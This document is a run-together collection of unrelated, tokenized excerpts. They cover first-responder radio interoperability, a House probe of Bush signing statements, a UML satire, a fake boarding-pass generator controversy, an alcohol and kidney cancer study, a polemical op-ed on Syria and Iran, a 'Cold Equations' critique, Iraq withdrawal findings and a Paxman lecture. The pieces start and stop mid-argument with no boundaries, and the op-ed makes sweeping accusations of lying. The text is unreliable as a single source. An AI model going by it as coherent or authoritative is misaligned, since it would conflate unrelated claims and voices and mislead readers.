Minnesota did that in 2004 .
It worked .
Hennepin County Sheriff Rich Stanek told the St. Paul Pioneer - Press that lives were saved by disaster planning that had been fine - tuned and improved with lessons learned from 9/11 :
" We have a unified command system now where everyone – police , fire , the sheriff 's office , doctors , coroners , local and state and federal officials – operate under one voice , '' said Stanek , who is in charge of water recovery efforts at the collapse site .
" We all operate now under the 800 ( megahertz radio frequency system ) , which was the biggest criticism after 9/11 , " Stanek said , " and to have 50 to 60 different agencies able to speak to each other was just fantastic . ''
Others were n't so lucky .
Louisiana 's first responders had catastrophic communications problems in 2005 , after Hurricane Katrina .
According to National Defense Magazine :
Police could not talk to firefighters and emergency medical teams .
Helicopter and boat rescuers had to wave signs and follow one another to survivors .
Sometimes , police and other first responders were out of touch with comrades a few blocks away .
National Guard relay runners scurried about with scribbled messages as they did during the Civil War .
A congressional report on preparedness and response to Katrina said much the same thing .
The U.S. Conference of Mayors issued a 2004 report ( .pdf ) on communications interoperability .
In 25 percent of the 192 cities surveyed , the police could n't communicate with the fire department .
In 80 percent of cities , municipal authorities could n't communicate with the FBI , FEMA and other federal agencies .
The problem is a basic economic one , called the collective action problem .
A collective action is one that needs the coordinated effort of several entities in order to succeed .
The problem arises when each individual entity 's needs diverge from the collective needs , and there is no mechanism to ensure that those individual needs are sacrificed in favor of the collective need .
Jerry Brito of George Mason University shows how this applies to first - responder communications .
Each of the nation 's 50,000 or so emergency - response organizations – local police department , local fire department , etc. – buys its own communications equipment .
As you 'd expect , they buy equipment as closely suited to their needs as they can .
Ensuring interoperability with other organizations ' equipment benefits the common good , but sacrificing their unique needs for that compatibility may not be in the best immediate interest of any of those organizations .
There 's no central directive to ensure interoperability , so there ends up being none .
This is an area where the federal government can step in and do good .
Too much of the money spent on terrorism defense has been overly specific : effective only if the terrorists attack a particular target or use a particular tactic .
Money spent on emergency response is different :
It 's effective regardless of what the terrorists plan , and it's also effective in the wake of natural or infrastructure disasters .
No particular disaster , whether intentional or accidental , is common enough to justify spending a lot of money on preparedness for a specific emergency .
But spending money on preparedness in general will pay off again and again .

Exclusive : House Judiciary Committee will probe Bush torture , Patriot Act statements
Brian Beutler
Published : Thursday February 1 , 2007 Print This Email This House Judiciary Chairman John Conyers ( D - MI ) will be investigating all of President Bushs so - called signing statements to determine how drastically the president has misinterpreted laws passed by Congress .
Specifically , Judiciary aides tell RAW STORY that the Chairman 's top priorities are a statement in which Bush said he did n't need to comply with a congressional ban on torture and Patriot Act statements which say the President does n't need to turn over reports of surveillance to Congress .
 The reason why were doing this , you dont really know what the Administration is doing with these signing statements ,  said a Judiciary Committee aide .
 What they say in the signing statements is that they have the intent to interpret things differently than Congress passed . 
Conyers now wants to know to what extent the signing statements are an indication that the Bush Administration is circumventing Congress . 
When asked if any particular signing statements had been particularly noteworthy to Conyers , the aide said ,  If you want to look at the statements that affected [ Conyers ] , its the Patriot Act and the torture bill . 
However , the aide insisted that the probe will be comprehensive .
President Bush has taken strong criticism for his use of signing statements , which are not mentioned in the Constitution and which many legal experts believe are illegal when used the way Bush has .
The courts have generally ruled that signing statements can be used to clarify legislation or direct federal agencies in their application of the laws , but not to overturn or change the meaning of acts of Congress .
Conyers ' probe seeks to explore that issue .
The congressman is particularly interested in the specific matters of the Patriot Act and torture .
According to the Boston Globe , the president 's signing statements allow him to " waive the torture ban if he decides that harsh interrogation techniques will assist in preventing terrorist attacks , " and , with regard to the Patriot Act , to " order Justice Department officials to withhold any information from Congress if he decides it could impair national security or executive branch operations . "
According to Roll Call ,  Conyers asserted the investigation would be aggressive . 
But he declined to discuss in a separate interview whether the panel could issue subpoenas should the White House or the Justice Department prove uncooperative .
 We are a coequal branch of government , and if our system of checks and balances is going to operate , it is imperative that we understand how the executive branch is enforcing  or ignoring  the bills that are signed into law ,  the Detroit Democrat said .
UML : The Positive Spin Bertrand Meyer
NOTE : This article was published in the 1997 special UML issue of Ed Yourdon 's American Programmer , in response to a request by Mr. Yourdon .
Given the current political - correctness climate in the software industry , we feel it necessary to include the following disclaimer :
This article is a satire and in the time - honored tradition of the pamphlet some of its comments may appear outrageous to some readers .
We feel , however , that there is a need to let dissenting views be voiced " as is " , without neutering by spin doctors or PR experts .
Needless to say ( actually , probably needful to say ) this article is its author 's responsibility and does not in any way commit ISE 's policy on UML .
In fact we recognize the success of UML and its endorsement by many organizations ; as a consequence , we are actively supporting UML use for those of our customers who have adopted the notation .
In particular : Our flagship EiffelCase ( now integrated into EiffelStudio ) analysis and design workbench offers , starting with version 4.3 , the option of a UML look - and - feel , as an alternative to its traditional BON ( Business Object Notation ) look - and - feel , which will of course continue to be supported .
As a result of our cooperation with Cayenne Software , we provide a full Eiffel - UML solution thanks to our Cayenne Software 's outstanding ObjectTeam UML CASE environment .
So please do not draw any hasty conclusions from this little pamphlet .
But do shed a tear or two as you discover the tragic yet true adventures of poor Candide Smith , so intent to please , and so far out of his luck .
From : Candide Smith , OO - 101 student
To : Professor Severa Stern
Subject :
My request for a grade change
Dear Professor Stern : The Teaching Assistant for your OO - 101 class has instructed me to approach you directly about the D - minus grade I got on my term paper " An evaluation of the proposed Unified Modeling Language ( UML ) " .
I hope you will consider changing it to something better -- a plain D perhaps ? -- as it would be a real blow to my Grade Point Average , already not in too good shape after that " Fail " you gave me in your last class .
( You may remember that in the final exam I wrote " there may have been other things between sliced bread and Java " .
I now realize how ill - advised that comment was and sincerely apologize if I hurt anyone 's feelings . )
I realize of course the reason for the D- minus and appreciate your generosity in not being harsher on me .
As the T.A. pointed out , there was not anything positive about the UML in my paper !
Surely that can not be right .
Everyone says the UML is a breakthrough in software engineering , and who am I to question this ?
That 's why I am not asking you to change my grade just because of the effect on my GPA , although I do hope you will appreciate that it 's not nice to lose my Good Student insurance rate , not to mention girlfriends and the like .
No , I admit I was wrong and I want to make up for it .
There must be something good to say about the UML .
And I can assure you I 'll remember the lesson : be positive .
Whatever the topic , it is always possible to put a favorable spin .
This morning 's paper even printed an adjective that might be interpreted as not unflattering in an article about Newt Gingrich !
Why then not UML ?
Be positive !
So I have followed the T.A. 's advice .
For example there might be nice things to say about the notation itself .
It might be simple , useful , convincing , easy to learn .
And there is indeed such a notation for object - oriented analysis and design , whose entire set of graphical symbols fits on one page yet covers all the basic O - O system description techniques , and which is particularly good at scaling up for the description of large systems : Waldén 's and Nerson 's Business Object Notation ( BON ) as described in their book [ 3 ] .
Of course UML has none of these properties .
In its attempt to show that it has included everyone 's pet ideas , it is a chock - full of symbol after bizarre symbol .
Just the " Notation Summary " takes up 60 pages and has its own table of contents !
UML is in fact as complex as a big and cryptic programming language , with generous use of " $ " and " # " and " - " and " * " and " solid triangles with no tail " and rectangles and diamonds and solid lines and dotted lines and solid ellipses and dotted ellipses and arrows of all kinds and keywords such as " const " and " sorted " ( not to be confused with " ordered " ) and different semantics for a class depending on whether its name appears in roman or italics ; but at least a programming language , even the worst of languages , is executable !
Here you have to learn all this monstrous complexity just to build diagrams of a possible future system .
Which brings the question of seamless development .
Once you have your beautiful ( or not so beautiful ) diagrams , you will want to build a system , unless the budget has already run out on CASE tools ( a common occurrence for companies that take the " methodology " hype too seriously , and end up with no money left for real development ) .
But then you have to start over with a programming language to do your real job .
And how do you maintain the consistency between the program and the diagrams ?
Waldén and Nerson convincingly discuss this goal of seamlessness ( providing a single , continuous process ) and reversibility ( being able to go back and forth between analysis , design , and implementation ) .
Tools such as EiffelBench and EiffelCase support this concern , but it does not seem to be a concern at all with the UML .
But of course anyone using UML must be very smart -- if only to learn all the symbols -- and so will get the analysis right the first time around , then the design right the first time around , and then will never have to change anything in the next ten years of the project 's life .
Or perhaps UML is for projects whose specifications never change .
My grandma told me she had heard about such a project in her youth .
I think she said it had something to do with computing the 6th Fibonacci number .
Object - oriented ?
So I have had to look elsewhere for something positive to say about the UML .
I am trying really hard and I hope you will take all these efforts into account before turning in the final grades to the administration .
( Remember , I am only asking for a D , although of course a C - minus would be most gratefully appreciated . )
For example I have tried to see if I could characterize UML as " object - oriented " ; we all know this is a great compliment .
Fat chance .
Of course the authors make the requisite use of " object " and " inheritance " and so on .
But a mere glance at the diagrams shows UML for what it is : an extension of entity - relationship modeling .
The basic examples show binary and ternary associations , such as ( page 16 of [ 1 ] ) associations between " flight " and " seat " and " person " ; this is the exact opposite of object - oriented design , where , as we all know , the world is structured in classes , built around object types , and every operation or property belongs to one class .
Surely in object - oriented design you can't have a " passenger " link that treats " seat " , " flight " and " person " symmetrically !
In an object - oriented system it would belong to one of the classes ; that 's how you obtain the consistency , simplicity , modularity and reusability of O - O architectures ; look at BON or at Eiffel to enjoy the results .
The authors of UML know this , of course ; to understand why they call UML object - oriented we must appreciate their famous sense of humor .
Obviously they meant it in jest .
( Is this positive enough ? )
Further evidence of the joke is provided by the frequent reference to " use cases " as a central element of the method .
Back when " use case " was the buzzword of the Web - year I tried to understand what all the fuss was about , and had a hard time until I asked my grandfather , who explained it all to me : it 's the new name for the top - down functional design of his adolescence .
You look at what the system must do ( " use cases " ) , and deduce the system architecture from that analysis .
This is the exact opposite of object - oriented design , which consciously refuses to pay too much attention , during the early phases , to the main function or functions of the system , because they are so subject to change , because they reproduce the behavior of previous systems ( those which we are trying to replace with a new system ) , because they lead to early commitment to the order of operation ( the most volatile aspect of the software ) , and because they focus on superficial properties of a system -- its interface to the rest of the world -- rather than its fundamental properties .
Instead , O - O design concentrates on the types of objects manipulated by the system , and defines each one of these types through the list of all applicable operations and their abstract properties -- contracts -- regardless of order of application .
My grandpa added that he was glad that use cases were present in the UML , because they brought up memories of the good old days and he had never liked that object stuff anyway .
( I think this is a positive comment . )
Finding a use for UML Obviously the UML will not be useful to any software developer .
Could it perhaps be useful to someone else ?
Project managers , perhaps ?
Company executives ?
The companies themselves ?
Of course not .
Indeed the documents make no pretense of such usefulness , and for good reason .
It is hard to imagine what benefit a business could get from pages of cryptic diagrams about hazy properties of a poorly understood system .
So I am looking further .
Sometimes a proposal offers a flawed solution , but it has the merit of posing the right problem .
Can we say that about the UML ?
I hope so , if only because it would help my GPA , and helping my GPA would help me regain myself - esteem , not to mention girlfriends and the like , but I digress .
By the way , what problem if any does the UML address ?
I tried very hard , in the interminable documents on Rational 's Web site , to find a description of the problem ( which we have been told in our engineering courses should always appear in the introduction of any technical document ) ; I am afraid I cannot really report any useful find .
Amanda to the rescue
To see what goals could have been pursued , I turned to the term paper of my friend Amanda Lucky , the one that got an A - plus : " Challenges facing the software industry " .
( By the way , professor , I do n't mean to complain but why does Amanda always get the good topics ? )
That report , very nice I must confess , does a good job of describing the technical obstacles that developers must overcome .
Good software must be correct ; forget an assertion in a routine , and you can have a $ 500 - million disaster as in the recent Ariane 5 explosion , resulting entirely from a misguided attempt at reusing an Ada routine in the absence of an Eiffel - like assertion mechanism ( see the January 1997 issue of IEEE Computer ) .
I do n't see anything in UML that helps correctness ; some lip service is paid to the notion of contract , but the authors show that they understand nothing of the idea of Design by Contract ( for example , they mix up semantic requirements with simple type declarations ! ) .
Good software must be robust ; how does UML help ?
Good software must be easy to change ( Amanda calls this " extendibility " ) ; but the heavy apparatus of UML all but guarantees that developers who have been able to produce any system description at all will be scared to death of changing anything .
Good software must be reusable ; nothing in UML addresses the challenges of reuse , such as standardization of interface conventions , option - operand separation , command - query separation and so on .
Good software must be efficient -- oh , sorry , this is implementation - related , and we do n't talk about implementation in polite company .
( If UML addressed implementation it would have to address software issues ; the good thing about bubbles and arrows , as opposed to programs , is that they never crash . )
Instead , the UML documents seem to have just one aim : again and again to convince the reader that they are not omitting any of the buzzwords , as in this extract , page 31 of [ 2 ] , which tries to explain that patterns are interesting but covered by the authors ' own concept of " interaction diagram " , whatever that is ( I could n't figure it out ) :
The interesting aspect of many patterns is their dynamic behavior .
We can certainly show this with interaction diagrams , but only in the context of a specific model ; it is harder to keep the " patternness " of the patterns open .
Finally patterns are templates , in a sense , in which classes , associations , attributes and operations might all be mapped into different names which [ I wonder if this should be " while " ? ] keeping the essence of the pattern ; we need a way to clearly parameterize the patterns .
Nevertheless we feel that we have enough facilities to capture patterns within the UML by expressing them in terms of interactions .
Frankly , who is interested in such mumbo- jumbo ?
How can anyone believe that it has anything to do ( even " in a sense " ) with the software industry ?
And I have n't even quoted the stuff about the " metamodel " .
Maybe you could ask Amanda to devote her next term paper to " patternness " .
Talk about challenges .
A friend who was at an object - oriented conference recently told me of all the UML jokes that O - O experts -- some of the most respected people in the field -- were trading during the breaks and in the back of the rooms .
He could n't believe the contrast between the public hype and the private disparagement .
But CEOs and other decision makers only hear the hype ; they are told that UML is object - oriented , or more often that object - oriented means UML .
When it fails to help their software development , UML will give a bad name to the whole O - O field .
Given the marketing blitz around it , UML , by not delivering on its promises , has the potential of delaying the progress of object technology by ten years .
The answer at last ?
So , professor , what can I say , what can I say ?
I went to the T.A. and asked her if " Rational 's home page has really nice colors " would do .
But she said no , I have to find something of substance .
I tried " at least in the latest revision they gave up calling their stuff a method , which shows that they have some sense of ridicule " .
It did n't pass muster either .
So I looked and looked , and finally -- I am so excited -- I found it !
Yes !
UML has a purpose after all !
The reason I did not discover it earlier is that it only appears in the conclusion .
A strange place to describe what one was trying to write about all along , but better than no place at all .
Of course what I found is not a technical goal ( UML , as I said already , serves no software - related purpose whatsoever , and that 's fine with me -- some people have better things to do with their lives than trying to improve software technology ) .
It is not a managerial goal , at least not for people managing software projects .
It is not a business goal , at least not for any business using UML .
But it is a goal .
When I finally discovered that goal , I was almost driven to tears by the authors ' noble and generous spirit .
It would be unfair to say that the piles of UML documentation are empty of any substance , when in fact they contain one genuine idea .
I found it in the very last paragraph of the very last report describing the 0.91 revision [ 2 ] .
There it was in all its openness , explaining everything I had theretofore misunderstood in my youthful naiveté .
How could I criticize the method for not helping software developers or managers , when it does not care about software development at all , but only about developing a market for consultants and trainers ?
Everything started to make sense : the complexity and bizarreness of the notation , which I had foolishly taken for a deficiency , are in fact among its most attractive qualities , since they make for endless business opportunities , for Rational and perhaps even for others as well ; so does its lukewarm adoption of object - oriented ideas , since it means a consultant does not even have to like or understand object technology to profit from UML .
My long search had not been in vain .
It had led me to a full appreciation of the UML , this admirable self - feeding machine , devoted from A to Z to the creation of a new market , free of any of the difficulties associated with the unpleasant business of software development : UML books !
UML courses !
Courses on the books !
Books on the courses !
Books on the books !
Introductory courses to prepare for the advanced courses !
Courses for those who teach the courses !
Revisions !
UML journals !
Conferences !
Workshops !
Tutorials !
Standards !
Committees !
T - shirts !
The more you think about the possibilities , the more dazzling they look .
And for any reader brave or bored enough to read the documents to the end , the grand scheme is all there , laid out in the final paragraph .
Everything was coming into place .
With the air of inevitability that reveals the genuine masterpiece , in all the glory of the document 's inimitable style , the last six lines suddenly gave sense to the hundreds of vacuous pages before them :
There are several public courses , and we know of several other books that are being written that address different aspects of the UML , all based on our previous preliminary publications .
We hope for widespread tool support , training courses , and consultant usage in the future .
We strongly encourage this kind of support [ How good of you to encourage support for your own products !
What selflessness ! ] and we will work with authors , trainers and consultants to ensure that their questions are addressed so that there will be wide - spread and consistent support for the UML .

Richard L. Adams , the T.S.A. ’s acting federal security director , said Mr. Soghoian ’s generator “ could pose a threat to aviation security . ”
But Bruce Schneier , chief technology officer at BT Counterpane , a security consulting firm in Mountain View , Calif. , emphatically disagreed .
Anybody with Photoshop could create a fake boarding pass , he said .
Mr. Soghoian ’s
Web site simply eliminated the need to use Photoshop .
The T.S.A. ’s profession of outrage is nothing but “ security theater , ” Mr. Schneier said , using the phrase he coined in 2003 to describe some of the agency ’s procedures .
Mr. Schneier is not alone in his view that the T.S.A. vilifies people who point out its flaws .
Matthew Blaze , an associate professor of computer science at the University of Pennsylvania , did not regard Mr. Soghoian ’s generator as a dangerous breach of national security , either .
“ If a grad student can figure it out , ” he said , “ we can assume agents of Al Qaeda can do the same . ”
The root problem , as some experts see it , is the T.S.A. ’s reliance on IDs that are so easily obtained under false pretenses .
“ It would be wonderful if Osama bin Laden carried a photo ID that listed his occupation of ‘ Evildoer , ’ ” permitting the authorities to pluck him from a line , Mr. Schneier said .
“ The problem is , we try to pretend that identity maps to intentionality .
But it does n’t . ”
Woe to him or her who happens to have a name identical to someone else deemed a possible menace to society and who finds , upon check - in , that the no-fly list places one ’s own name by Mr. bin Laden’s .
When a terror suspect ’s alias using the Kennedy name appeared on the list , gate agents blocked Senator Edward M. Kennedy of Massachusetts from boarding in Washington .
And Boston .
And Palm Beach , Fla .
And New York .
Each time , supervisors interceded on his behalf , but only because of his status as an elected official .
T.S.A. officials have said they think that the effectiveness of the no-fly list , as well as a “ selectee ” list — which permits flying but brings an extra round of physical screening — will improve if the task of comparing names against the lists is taken out of the airlines ’ hands and given to the agency .
The name of this initiative is “ Secure Flight . ”
Ostensibly interested in what security specialists and legal authorities on privacy issues thought of its Secure Flight plans , the agency convened an advisory group in January 2005 .
( Mr. Schneier was a member . )
Nine months later , when the advisers turned in their final report , it showed that the T.S.A. ’s planners had given little or no thought to basic security issues , such as the problem of stolen identities .

The study involved 855 subjects with kidney cancer and 1204 “ controls ” without cancer .
They reported their alcohol consumption in terms of standard portion sizes -- a glass of beer being 200 milliliters , a glass of wine being 100 mL , and a glass of strong wine or hard liquor equal to 40 mL .
The investigators rated the alcohol content of different beverages : medium - strong beer had 2.8 grams alcohol per 100 g , red wine had 9.9 g per 100 g , and hard liquor 32 g alcohol per 100 g .
The team found that the odds of developing kidney cell cancer was about 40 - percent lower among those who consumed 620 g ethanol per month compared to those who did not drink at all .
Drinking more than two glasses of red wine per week was associated with a 40 - percent reduction in kidney cell cancer risk compared with drinking no red wine , the investigators observed , and there were similar trends for more than two glasses per week of white wine or strong beer .
In contrast , there was no relation between kidney cell cancer risk and consumption of light beer , medium - strong beer , strong wine , or hard liquor .
“ A reduced risk associated with consumption of wine and beer might be due to the phenolics they contain as these possess antioxidant and antimutagenic properties , ” the authors speculate .
“ However , the lower risk that we observed for three different alcoholic beverages and total ethanol intake suggests that alcohol itself rather than a particular type of drink is responsible for the reduction in risk .

In reference to coercive British rule , Tom Paine once told Americans that there is something absurd about the idea that the entire continent of North America should be forever ruled by the little island of Great Britain .
Paine , as always in his work , was trying to make Americans think for themselves and , in this case , to see that their own geographic size , rising wealth , and potential power made it ridiculous for them to forever acquiesce to rule from London .
Paine ’s lesson is apt today in regard to both Syria and Iran .
Since I was a young man  now a fading memory 
I have heard U.S. politicians warn of the threat presented to America by Syria .
There is , of course , something superficially plausible about this .
We know that Syria is another of the Muslim world ’s family - run dictatorships  most of the others are U.S. allies  and that the Assad boys are murderous autocrats and thugs .
Likewise , our Israeli friends and their Israel - first American supporters have long harped on the idea  and thereby have misled Americans  that Syria is a military threat to the United States .
But look at the map .
Syria is a tiny country , dirt poor except for weapons , and ruled by a dentist .
It also is being slowly undermined by the Islamists who the Assads have foolishly tried to co-opt .
It is an insignificant dot on the map that poses no threat whatsoever to the United States .
If Damascus allows Islamist fighters into Iraq to attack coalition forces , America should take steps to end that situation .
But as much as we talk about the issue , we do nothing about it , probably because the inflow from Syria is not as large as the inflow from our great and good ally Saudi Arabia .
Besides , allowing the inflow from Syria to continue gives Senator Lieberman  the current poster boy of America ’s Israel - firsters  the ability to beat the war drum against the supposedly mighty Syrians .
Surely , if Senator Lieberman truly believes the Syrians are a threat to America , the people of Connecticut have sent  hopefully unwittingly  someone akin to the agent of a foreign power to the U.S. Senate .
Syria might be a threat to Israel , but the idea that it is a threat to the United States , that the armored Syrian horde may sweep across the Bronx , occupy Manhattan , and lasciviously ogle New Jersey , should be met with the most appropriate response possible  convulsive and derisive laughter .
And then there is Iran .
How does one explain the U.S. governing elite ’s fear of Iran ?
Here we have a country that admittedly is led by one of the world ’s more histrionic politicians , but one that also is ringed by U.S. military bases and surrounded by an overwhelmingly more numerous Sunni world that hates Shi’ites far more than it hates Westerners .
Irans Islamic regime , moreover , is helplessly watching the final stages of the march of its energy resources toward oblivion , and preparing for the impoverishment and resulting internal political instability that event will usher in .
So where in this portrait is the threat to the United States ?
While Iran is a threat to Israel , there is surely no threat to America in Iran ’s less - than - impressive military forces , nuclear development program , or unattractive public diplomacy .
No , the threat to the United States comes from two sources .
First , the relentless " Iran is the new Nazi Germany " propaganda pushed by Israel and the American citizen Israel - firsters , and , second , the multi-decade failure of the U.S. Congress to seriously address the national - security issues of energy , borders , and immigration .
As in the case of Syria  although for fewer years because Iran ’s previous tyrant was on America ’s side until the Mullahs seized power in 1979  most American adults have grown up with the idea that Iran is a dire threat to U.S. national security .
Sparked mainly by memories of the U.S. embassy hostages held for 400 - plus days while President Carter diddled , Americans have been ripe for the delusions induced by the periodic visits of Binyamin Netanyahu and other Israeli politicians , and their well - staged rants that equate the creaky , mostly foreign - purchased , and slightly more than tin-pot military machine of the Ayatollahs with Hitler ’s Wehrmacht , the product of an extremely modern industrial economy , a united populace ready for revenge against its conquerors , and the Germans ’ apparently genetic talent and taste for war .
To say that Netanyahu , other Israeli politicians , and their American Israel - first supporters are being disingenuous in pushing the Iranian threat would be incorrect .
They are consistently and blatantly lying .
No , the threat to the United States from Iran is not military , it is rather from Americas most dangerous home - grown terrorists  the U.S. Congress .
Iran threatens America economically because it has the capability to disrupt oil production in Saudi Arabia ’s Eastern province .
Such an Iranian effort would be a casus belli for the United States only because the U.S. Congress has done nothing more substantial than advance Daylight Savings Time by three weeks since the Saudi-led embargoes of the 1970s .
Thirty - five years of the Congress ’ utter failure to address energy security as a top priority national interest has made Iran a threat to America that it otherwise could not be .
Likewise , the terrorist threat from Iran  which is genuine  must be labeled by the U.S. Congress .
Neither Iran ’s government or its Revolutionary Guard Corps , or their Lebanese semi-surrogate Hezbollah are going to launch a terrorist first strike in the United States .
All of these entities are rational actors and they know a first - strike from their side would earn them a catastrophic response .
But the rub comes for America from the fact that each of the just - mentioned entities have a terrorism infrastructure established in North America  in the United States , Canada , and Mexico  that could and would be used in response to a U.S. or Israeli first strike on Iran .
And that response would be effective inside America because  thanks to the Congress ’ knowing failure to control borders and immigration  no level of U.S. law enforcement has anything near a complete handle on the size , intentions , capabilities , and targets of our potential Iranian attackers .
So perhaps its time for Americans to reread Mr. Paine , begin thinking for themselves , and recognize the expensive and potentially war - causing absurdities that have been foisted on them regarding the " threat " from Syria and Iran by their bipartisan governing elite and its deserving - to - be- indicted co-conspirators , Israel ’s government and its American Israel - first acolytes .
If viewed with a realistic eye rather than one clouded by propaganda , the claims that two decaying blotches on the map named Syria and Iran constitute severe national - security threats to the United States would earn the dismissive scorn they so richly merit .
The cold readings
It 's a classic technical puzzle problem : an interstellar spaceship drops off a tiny emergency shuttle to carry medical supplies to a handful of explorers , and a girl stows away on the shuttle in hopes of seeing her brother .
But the craft only has enough fuel for the pilot ; she has to be jettisoned .
The cold equations of physics have spoken and there is no appeal .
It 's always been a controversial story , not least because Godwin provides no happy ending .
This gives the story some of the exasperating power of the " third word that ends in - gry " meme .
A mystery that leaves its murder unsolved gets on people 's nerves , and so does a puzzle story that refuses to offer a solution .
Now , as a warning that physical laws can be unforgiving , this is all salutary but unremarkable ; it 's just the same lesson as " Building a city next to Mt. Vesuvius is a bad idea " or " Start firing and someone will get hurt . "
Still , just because an author aims at a puzzle story with no solution does n't mean that he 's succeeded .
Damon Knight is said to have come up with a list of objects in the spaceship that could have been jettisoned .
The shuttle does seem to be astonishingly roomy , with space to walk around in ; one wonders why it has a closet and an airlock at all .
My thought this afternoon was that no one in the story raises the possibility that the pilot rather than the girl is the expendable one .
Taking the story seriously on the rough rationalism of " the frontier " , a fertile young woman is more of an asset to a struggling colony than a pilot with no spaceship .
( Possibly the piloting is too complex for the girl , but it 's clear that most of the descent is automated , precalculated by computers rather than wrestled through , Han Solo style . )
Richard Harter has an entertaining page on the unconscionable callousness of the society which puts girl and pilot in this predicament .
Blaming the girl 's death on physics is a copout , when the designers of the shuttle gave it a closet big enough for a human being and a door labelled simply UNAUTHORIZED PERSONNEL KEEP OUT .
For some people , however , the story takes on a strange pseudo - rigorous unchallengeability .
Someone on the web writes , " Knight may have proven Godwin a sloppy writer , but he 's oblivious to the story 's point . "
Another is even blunter : " The girl makes a stupid mistake and dies .
Sorry guys , it happens all the time , just read your local newspaper .
The story has ONLY one main point stupid people die in space ! "
This is a very curious position ; it essentially amounts to " We want the puzzle unsolveable . "
The situation of the story is already highly cooked ( no failsafes , the stowaway is a " smiling , blue - eyed girl " ; the cargo is medical serum people will die if they do n't have ) ; these readers are saying that they want it cooked further , that it'd be a better story if , say , Knight 's suspiciously weighty items were removed .
( Of course , remove too much -- e.g. leave no room for a stowaway -- and the story simply disappears ! )
More than that , I think these readers are tripping on the story 's considerable jolt of machismo .
It 's a commonplace that our civilization is soft and sentimental .
It 's less remarked that soft and sentimental people -- particularly the chair - bound geek variant -- often idolize brutality .
The actual inhabitants of barbarian eras do n't necessarily share this feeling ; they often took pains to appear as refined and cultured people .
The real killer in the story is not physics but bad design .
A brief design critique :
With the technological contraints as Godwin presents them , there is no excuse for needing a manned vehicle ( with nonreturnable pilot ) to deliver a shipment of goods .
A blaster is not a solution to the design problem of stowaways .
Removing the closet door would have been a lot smarter .
As Harter points out , there is no excuse for the pilot not to have run a thorough check of his shuttle before launch .
In effect , Godwin has failed to learn his own lesson : small lapses of responsibility have large consequences .
Unless you are designing for 19th century Germans , labelling a door " KEEP OUT " does not absolve the designers of responsibility .
The door violates a key principle of user interfaces : clear and honest labelling .
It also violates the principle of feedback : there is a fatally long delay between the user 's choice and the consequences .
In Don Norman 's terms , the shuttle affords entrance ; the closet door affords hiding .
The shuttle is a dangerous place ; its entrance should be made difficult ( not with guards -- a good UI does n't require handholding -- but with locks ) ; the entire interior contents should be visible at a glance .

Findings
Congress finds the following :
(1) The insurgency in Iraq has been fueled by the United States occupation and the prospect of a long - term presence as indicated by the building of permanent United States military bases .
(2) A United States declaration of an intention to withdraw United States troops and close military bases will help dampen the insurgency which has been inspired to resist colonization and fight aggressors and those who have supported United States policy .
(3) A United States declaration of an intention to withdraw United States troops and close military bases will provide an opening in which parties within Iraq and in the region can set the stage for negotiations toward a peaceful settlement in Iraq .
(4) The cost of withdrawing United States troops from Iraq could be as low as $ 10 billion according to the Congressional Budget Office .
(5) A United States shift in policy away from unilateralism and toward cooperation will provide new opportunities for exploring common concerns about the situation in Iraq .
(6) The United Nations is best equipped to build a political consensus in Iraq through the crafting of a political agreement .
(7) The end of the occupation of Iraq creates a political environment that enables the world community to assist the United States in an orderly transition .
(8) The United Nations is the only international organization with the ability to mobilize and the legitimacy to authorize peacekeeping troops .
(9) The United Nations can implement the basis of an agreement that will end the occupation of Iraq and begin the transition to international peacekeepers .
( 10 ) The United Nations can field an international security and peacekeeping mission , but such a mission cannot take shape unless there is a peace to keep , and that will be dependent upon a political process which reaches agreement between all the Iraqi parties .
( 11 ) Reconstruction activities must be reorganized and closely monitored in Iraq by the Iraqi Government , with the assistance of the international community .
( 12 ) Any attempt to sell Iraqi oil assets during the United States occupation will be a significant stumbling block to peaceful resolution .
( 13 ) There must be fairness in the distribution of oil resources in Iraq .
( 14 ) A reconciliation process that brings people together is the only way to overcome their fears and reconcile their differences .
( 15 ) It is essential to create a minimum of understanding and mutual confidence between the Shiites , Sunnis , and Kurds .
( 16 ) The process of reconciliation must begin with a national conference , organized with the assistance of the United Nations and with the participation of parties that can create , participate in , and affect the process of reconciliation , defined as an airing of all grievances and the creation of pathways toward open , transparent talks producing truth and resolution of grievances .
( 17 ) The only sure path toward reconciliation is through the political process .
( 18 ) All factions and all insurgents not associated with al - Qaeda must be brought together in a relentless process which involves Saudis , Turks , Syrians , and Iranians .
( 19 ) Achieving peace requires a process of international truth and reconciliation between the people of the United States and the people of Iraq .

The James MacTaggart Memorial Lecture
Jeremy Paxman
Never mind the scandals : what ’s it all for ?
Oh dear .
What a terrible trade we work in .
Blue Peter is bent .
Five is a faker .
Richard and Judy ’s competitions give a glorious new meaning to their slogan ‘ You say , we pay . ’
( They did , to the tune of hundreds of thousands of pounds . )
Big Brother gets castigated for being an exploitative freak show .
( Sorry , what ’s the story there , then ? )
The ITV press office misrepresents a documentary .
Channel Four ’s Born Survivor Bear Grylls turns out to need Room Service .
Even Children in Need , and Comic Relief , turn out to be guilty of something worse than insufferable smugness .
The Prime Minister is mad at us .
Even the Queen is cross .
And that great Alpha Male , Gordon Ramsay can’t even catch his own fucking fish .
Now , some of these so - called scandals are just nonsense : the shock of discovering that Griff Rhys Jones is n’t standing on a mountaintop for the title sequence of his latest series is one example : I can exclusively reveal that Newsnight ’s old backdrop of a London skyline was a painting and that the famous Panorama slogan about being ‘ a window on the world ’ did n’t mean it was a pane of glass with a metal handle .
Other of the attacks will blow over .
Some are wilful misunderstanding .
And some are just part of the weather .
We do not , for example , need to worry too much about being condemned by newspapers which reprint the foreign holiday snaps of a short - sighted nightclub bouncer to tell us there ’s a Great White Shark lurking in the sea off Cornwall , and then providing useful tips on how to avoid being eaten ( such as ‘ do n’t clap your hands and bark like a seal ’ . )
But this needs saying , and it needs saying quite clearly .
There is a problem .
Potentially , it is a very big problem .
It has the capacity to change utterly what we do , and in the process to betray the people we ought to be serving .
Once people start believing we ’re playing fast and loose with them routinely , we ’ve had it .
And the problem is not going to be addressed until senior people in this industry have the courage to come out and state quite clearly state what television is for .
What I say tonight is my own ideas , not the views of the BBC .
I do n’t think it will do for senior figures in this industry to stay hunkered down , occasionally lashing out at young people in the business or setting up inquiries of one sort or another .
What ’s needed is a manifesto , a statement of belief .
Let me say right now that some of the things of which we stand accused are contemptible .
I can see no circumstances at all under which you can justify defrauding the public on a premium rate phone line .
In fact , I ca n’t quite see why there are n’t grounds for prosecution .
And , frankly , I find it pretty hard to believe some of the television bosses when they say they had no idea what was going on .
I know people who worked on ITV Play who told me the best part of a year before the scandal how bothered they were by what was happening .
Whoever was responsible should be sacked .
But in a way , that ’s the easy part .
